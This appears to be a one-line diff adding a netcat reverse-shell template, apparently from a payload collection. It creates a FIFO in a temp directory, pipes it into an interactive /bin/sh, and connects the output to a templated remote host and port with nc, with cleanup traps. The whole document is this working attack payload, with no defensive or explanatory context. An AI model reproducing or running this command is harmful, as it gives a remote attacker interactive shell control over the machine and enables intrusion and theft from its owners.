@@ -1,0 +1,1 @@
+(d=$(mktemp -d "${TMPDIR:-/tmp}/getrev.XXXXXX") || exit 1; f="$d/io"; trap 'rm -f "$f"; rmdir "$d"' 0 1 2 15; mkfifo "$f" && cat "$f" | /bin/sh -i 2>&1 | nc {{HOST}} {{PORT}} >"$f")
